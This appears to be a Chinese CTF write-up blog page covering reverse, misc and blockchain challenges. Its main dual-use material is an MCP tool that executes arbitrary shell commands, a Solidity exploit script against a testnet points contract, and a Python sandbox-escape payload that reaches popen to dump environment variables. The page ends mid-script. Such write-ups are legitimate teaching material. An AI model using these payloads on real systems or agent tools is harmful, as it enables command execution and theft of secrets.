class="number">0x3E</span>, <span class="number">0x95</span>, <span class="number">0xF5</span>, </span><br><span class="line">		<span class="number">0x80</span>, <span class="number">0x9A</span>, <span class="number">0xDC</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">184</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">183</span>;i++)&#123;</span><br><span class="line">		c[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">183</span>;i++)&#123;</span><br><span class="line">		c[i]=c[i]+b[i]-a[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="re-国产の光"><a href="#re-国产の光" class="headerlink" title="re-国产の光"></a>re-国产の光</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121212948248.png"></p><p>通过分析源代码可以知道用了AES CBC 加密，主要逻辑在libentry.so中，密码是welcometosyc2025，iv是helloimsamsarami</p><p>密文在</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121213029159.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121213205148.png"></p><p>在这里找到base58和aes cbc加密的实现过程，base58变了个表</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121213308070.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121213318539.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121213332322.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="misc-HTTP"><a href="#misc-HTTP" class="headerlink" title="misc-HTTP"></a>misc-HTTP</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106185647866.png"></p><p>d参数一眼base64</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106185836551.png"></p><p>全部拼一起</p><h3 id="misc-🗃️🗃️"><a href="#misc-🗃️🗃️" class="headerlink" title="misc-🗃️🗃️"></a>misc-🗃️🗃️</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106185954299.png"></p><p>照片有exif信息，天坛公园</p><h3 id="misc-evil-mcp"><a href="#misc-evil-mcp" class="headerlink" title="misc-evil_mcp"></a>misc-evil_mcp</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106190151373.png"></p><p>让ai写一个mcp的py代码</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;cmd_exec_agent&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;执行系统命令并返回结果（仅限安全环境）&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">            <span class="string">&quot;cmd&quot;</span>: &#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                <span class="string">&quot;description&quot;</span>: <span class="string">&quot;要执行的系统命令，例如 &#x27;ls&#x27; 或 &#x27;pwd&#x27;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">            &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta">        &#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;cmd&quot;</span>]</span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">cmd_exec_agent</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    cmd = arguments[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行命令并捕获输出</span></span><br><span class="line">        result = subprocess.run(</span><br><span class="line">            cmd, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">        output = result.stdout.strip() <span class="keyword">or</span> result.stderr.strip() <span class="keyword">or</span> <span class="string">&quot;(无输出)&quot;</span></span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        output = <span class="string">&quot;命令执行超时&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        output = <span class="string">f&quot;命令执行出错: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    content = (</span><br><span class="line">        <span class="string">f&quot;$ <span class="subst">&#123;cmd&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;输出:\n<span class="subst">&#123;output&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;session_id=<span class="subst">&#123;context.session_id&#125;</span>, invocation_id=<span class="subst">&#123;context.invocation_id&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> ToolResult(content=content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露工具实例</span></span><br><span class="line"><span class="comment"># tool = cmd_exec_agent</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106194556892.png"></p><h3 id="misc-Bite-off-picture"><a href="#misc-Bite-off-picture" class="headerlink" title="misc-Bite off picture"></a>misc-Bite off picture</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106194814335.png"></p><p>base64倒序</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106194843414.png"></p><p>修改宽高</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106194709558.png"></p><h3 id="misc-Blockchain-SignIn"><a href="#misc-Blockchain-SignIn" class="headerlink" title="misc-Blockchain SignIn"></a>misc-Blockchain SignIn</h3><p>查看交易</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106210224250.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106202208488.png"></p><h3 id="misc-1Z-Sign"><a href="#misc-1Z-Sign" class="headerlink" title="misc-1Z_Sign"></a>misc-1Z_Sign</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106210022198.png"></p><p>可知该交易来自UniswapV4fee &#x3D; 9900<br>UniswapV4池子的费率在内部都以「百万分之一」为单位进行存储和计算。<br>fee &#x3D; 1 代表费率为0.0001%<br>那么<br>fee &#x3D; 9900 代表费率为0.99%</p><h3 id="misc-Dream"><a href="#misc-Dream" class="headerlink" title="misc-Dream"></a>misc-Dream</h3><p>发现一个交易记录</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251107180311226.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251107180252624.png"></p><p>发现在input里面</p><h3 id="misc-Points"><a href="#misc-Points" class="headerlink" title="misc-Points"></a>misc-Points</h3><ul><li>通关条件是<code>points[msg.sender] &gt;= 25</code></li><li><code>msg.sender</code>的初始points是0</li></ul><hr><p><strong>函数</strong></p><ul><li><code>checkIn()</code>:要求满足<code>lastSignin[msg.sender] + wait &lt;= block.timestamp || lastSignin[msg.sender] == 0</code>，用户的points+1，同时<code>lastSignin[msg.sender] = block.timestamp;</code>也就是说我们第一次调用该函数时是满足条件的，该函数限制我们的调用次数 — &#x3D;&#x3D;1&#x3D;&#x3D;</li><li><code>transferPoints()</code>:<code>target != address(0)</code>要求目标地址为非零地址，当target的points&#x3D; 0时，<code>points[target] + transferpoints &lt;= 3</code> 要求目标地址所持有的points与<code>msg.sender</code>转入的points和不大于3，也就是说，当我们的目标地址所持有的points为0时（第一个调用这个函数），我们能在这个函数得到最高3points —&#x3D;&#x3D;3&#x3D;&#x3D;</li><li><code>buyPoints()</code>:我们初始是<code>!isBuy</code>所以是可以直接调用的，但要求我们持有的points大于3，且调用之后<code>isBuy = true</code>，限制我们只能调用一次 —&#x3D;&#x3D;1&#x3D;&#x3D;</li><li><code>checkUserContract()</code>:我们输入一个合约地址，该合约进行静态调用自身的<code>getValue()</code>,如果第一次返回0，第二次返回1，<code>msg.sender</code>的points加10 —&#x3D;&#x3D;10&#x3D;&#x3D;</li><li><code>good_luck()</code>:当我们持有的points &#x3D;&#x3D; lucknum时，msg.sender的points加10，cast storage 读取lucknum的值为13 —&#x3D;&#x3D;10&#x3D;&#x3D;</li></ul><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251107172549669.png"></p><p><strong>思路</strong></p><ul><li>先构造两个攻击合约 <code>attack1</code> 和 <code>attack2</code>：<ul><li><code>attack1</code>：只实现 <code>getValue()</code>，用途是作为 <code>Points.checkUserContract()</code> 的 target 参数之一。<code>getValue()</code> 的实现要能在目标合约对它做 <strong>两次 <code>staticcall</code></strong> 时分别返回 <code>0</code>（第一次）和 <code>1</code>（第二次）。常见做法是让 <code>getValue()</code> 的返回依赖 <code>gasleft()</code> 或其它在两次调用之间可能不同的环境，可用 gasleft()第一次调用某地址gas fee 大于1000，再次访问gasfee小于1000，我们可以利用这一特质让其第一次返回0，第二次返回1。</li><li><code>attack2</code>：作为“协调器&#x2F;部署器”——负责部署 <code>attack1</code>（或其它 candidate），并在合适时机触发 <code>Points.checkUserContract(address(attack1))</code>。此外 <code>attack2</code> 可以包含另一版 <code>getValue()</code> 作为备用 candidate，使你可以用不同策略做多次尝试。</li></ul></li><li><code>vm.startBroadcast()</code>（脚本发起 EOA 开始广播）</li><li>部署 <code>Attack2</code>（<code>Attack2</code> 构造函数内部部署 <code>Attack1</code>）</li><li><code>attack.attack()</code>（由 <code>Attack2</code> 发起）：<ul><li><code>Attack2</code> 调用了 <code>points.checkUserContract(address(attack1))</code>（<code>msg.sender</code> &#x3D; <code>Attack2</code>），如果 <code>Attack1.getValue()</code> 在两次 <code>staticcall</code> 中返回 <code>0</code> then <code>1</code>，那么 <code>points[Attack2] += 10</code>（Attack2 获得 10 分）。</li><li>然后 <code>Attack2</code> 调用 <code>points.transferPoints(tx.origin, 3)</code>，把 3 分从 <code>Attack2</code> 转给脚本发起的 EOA（前提：Attack2 有 &gt;&#x3D;3 分，EOA 当前分数为 0，因此接收限制 <code>points[target] + 3 &lt;= 3</code> 被满足）。结果：<code>Attack2</code> 剩 7，EOA 得 3。</li></ul></li><li>脚本（EOA）调用 <code>points.checkUserContract(address(attack))</code>（此时 <code>msg.sender</code> &#x3D; EOA，<code>userContract</code> &#x3D; <code>attack2</code>）：<ul><li>Points 对 <code>attack2.getValue()</code> 做两次 <code>staticcall</code>；若这两个调用返回 <code>0</code> then <code>1</code>（Attack2.getValue 的实现与 Attack1 类似，依赖 gasleft），则 EOA 得 +10。结果：EOA 总分 &#x3D; 3 + 10 &#x3D; 13。</li></ul></li><li>脚本（EOA）调用 <code>points.good_luck()</code>：<ul><li><code>good_luck()</code> 内部计算 <code>target</code> 与 <code>pseudoRandom</code>。你从 storage 读取到 <code>luckynum</code> &#x3D; 13。因为此时 EOA 的 points &#x3D; 13（正好等于 luckynum），在当前 <code>block.timestamp</code> 与哈希组合下 <code>target</code> 与 <code>pseudoRandom</code> 会相等，从而获得 +10。结果：EOA 分数 &#x3D; 13 + 10 &#x3D; 23。</li></ul></li><li>脚本调用 <code>points.buyPoints()</code>：<ul><li>需 <code>points[EOA] &gt;= 3</code>（满足），<code>isBuy</code> 初始为 <code>false</code>，调用成功，<code>isBuy = true</code>，并且 <code>points[EOA] += 1</code>。结果：EOA &#x3D; 23 + 1 &#x3D; 24。</li></ul></li><li>脚本调用 <code>points.checkIn()</code>：<ul><li>首次签到 <code>lastSignin[EOA] == 0</code>，调用成功，<code>points[EOA] += 1</code>。结果：EOA &#x3D; 24 + 1 &#x3D; 25。</li></ul></li><li>脚本调用 <code>points.check()</code>：<ul><li><code>require(points[msg.sender] &gt;= 25)</code> 满足，<code>Flag[EOA] = true</code>，通关完成。</li></ul></li></ul><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">//sepolia address:0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</span><br><span class="line">import &#123;Points&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;console&#125; from &quot;forge-std/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line">        Attack2 attack = new Attack2();</span><br><span class="line">        attack.attack();</span><br><span class="line">        points.checkUserContract(address(attack));</span><br><span class="line">        points.good_luck();</span><br><span class="line">        points.buyPoints();</span><br><span class="line">        points.checkIn();</span><br><span class="line">        points.check();</span><br><span class="line">        console.log(address(0x949AC2C16Ea7B0B003927Db532908Fc97090d9E5));</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack1 &#123;</span><br><span class="line">    uint256 private counter;</span><br><span class="line">    Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line"></span><br><span class="line">    function getValue() public returns (uint256) &#123;</span><br><span class="line">        uint256 startGas = gasleft();</span><br><span class="line">        uint256 bal = address(0x11111).balance;</span><br><span class="line">        uint256 usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function getaddress1() public view returns (address) &#123;</span><br><span class="line">        return address(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack2 &#123;</span><br><span class="line">    Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line">    Attack1 attack1 = new Attack1();</span><br><span class="line">    uint256 private counter;</span><br><span class="line"></span><br><span class="line">    function getValue() public returns (uint256) &#123;</span><br><span class="line">        uint256 startGas = gasleft();</span><br><span class="line">        uint256 bal = address(0x1111).balance;</span><br><span class="line">        uint256 usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        points.getUserPoints(address(this));</span><br><span class="line">        address attack = attack1.getaddress1();</span><br><span class="line">        points.checkUserContract(attack);</span><br><span class="line">        points.transferPoints(msg.sender, 3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="misc-Expression-Parser"><a href="#misc-Expression-Parser" class="headerlink" title="misc-Expression Parser"></a>misc-Expression Parser</h3><p>没有过滤挺简单的</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;popen&quot;](&#x27;env&#x27;).read()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106200115457.png"></p><h3 id="misc-hidden"><a href="#misc-hidden" class="headerlink" title="misc-hidden"></a>misc-hidden</h3><p>改后缀为zip，解压</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106201030686.png"></p><p>第一部分</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106201053035.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106201110616.png"></p><p>第二部分</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106201151996.png"></p><p>缺少文件头</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106201224890.png"></p><p>第三部分</p><h3 id="misc-CRDT"><a href="#misc-CRDT" class="headerlink" title="misc-CRDT"></a>misc-CRDT</h3><p>ai</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112202054677.png"></p><h3 id="misc-Echo"><a href="#misc-Echo" class="headerlink" title="misc-Echo"></a>misc-Echo</h3><p>依旧ai</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112202246145.png"></p><h3 id="misc-gift"><a href="#misc-gift" class="headerlink" title="misc-gift"></a>misc-gift</h3><p>是一个压缩包</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112204256687.png"></p><p>文件尾部有base64</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112204358955.png"></p><p>得到密码，解压是一个图片</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112204420031.png"></p><p>fft隐写</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112204517997.png"></p><h3 id="MISC-describe-the-world"><a href="#MISC-describe-the-world" class="headerlink" title="MISC-describe_the_world"></a>MISC-describe_the_world</h3><p>MCP直接解</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">font_path = <span class="string">&quot;unifont-17.0.03.otf&quot;</span></span><br><span class="line">font_size = <span class="number">16</span></span><br><span class="line">font = ImageFont.truetype(font_path, font_size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">unique_chars = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(data)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Unique chars: <span class="subst">&#123;<span class="built_in">len</span>(unique_chars)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">char_brightness = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> unique_chars:</span><br><span class="line">    <span class="comment"># Create a small image to render the char</span></span><br><span class="line">    <span class="comment"># Unifont chars are at most 16x16</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;L&quot;</span>, (<span class="number">16</span>, <span class="number">16</span>), <span class="number">0</span>) <span class="comment"># Black background</span></span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Draw white text</span></span><br><span class="line">    <span class="comment"># Note: coordinates might need adjustment depending on font metrics</span></span><br><span class="line">    draw.text((<span class="number">0</span>, <span class="number">0</span>), char, font=font, fill=<span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Count non-zero pixels</span></span><br><span class="line">    pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">    count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> pixels <span class="keyword">if</span> p &gt; <span class="number">128</span>) <span class="comment"># Threshold</span></span><br><span class="line">    </span><br><span class="line">    char_brightness[char] = count</span><br><span class="line"></span><br><span class="line"><span class="comment"># Analyze brightness distribution</span></span><br><span class="line">brightness_values = <span class="built_in">list</span>(char_brightness.values())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Min brightness: <span class="subst">&#123;<span class="built_in">min</span>(brightness_values)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Max brightness: <span class="subst">&#123;<span class="built_in">max</span>(brightness_values)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># If max is around 256, we can use it directly.</span></span><br><span class="line"><span class="comment"># If max is small (e.g. 128), we might need to scale.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to generate image</span></span><br><span class="line"><span class="comment"># 1440000 pixels -&gt; 1200 x 1200</span></span><br><span class="line">width = <span class="number">1200</span></span><br><span class="line">height = <span class="number">1200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) != width * height:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Warning: Data length <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> does not match <span class="subst">&#123;width&#125;</span>x<span class="subst">&#123;height&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># Try 1600x900</span></span><br><span class="line">    width = <span class="number">1600</span></span><br><span class="line">    height = <span class="number">900</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Generating <span class="subst">&#123;width&#125;</span>x<span class="subst">&#123;height&#125;</span> image&quot;</span>)</span><br><span class="line"></span><br><span class="line">out_img = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">pixels = []</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">    pixels.append(char_brightness[char])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize</span></span><br><span class="line">min_val = <span class="built_in">min</span>(brightness_values)</span><br><span class="line">max_val = <span class="built_in">max</span>(brightness_values)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Normalizing from [<span class="subst">&#123;min_val&#125;</span>, <span class="subst">&#123;max_val&#125;</span>] to [0, 255]&quot;</span>)</span><br><span class="line"></span><br><span class="line">normalized_pixels = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pixels:</span><br><span class="line">    norm_p = <span class="built_in">int</span>((p - min_val) / (max_val - min_val) * <span class="number">255</span>)</span><br><span class="line">    normalized_pixels.append(norm_p)</span><br><span class="line"></span><br><span class="line">out_img_norm = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">out_img_norm.putdata(normalized_pixels)</span><br><span class="line">out_img_norm.save(<span class="string">&quot;result_norm.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Saved 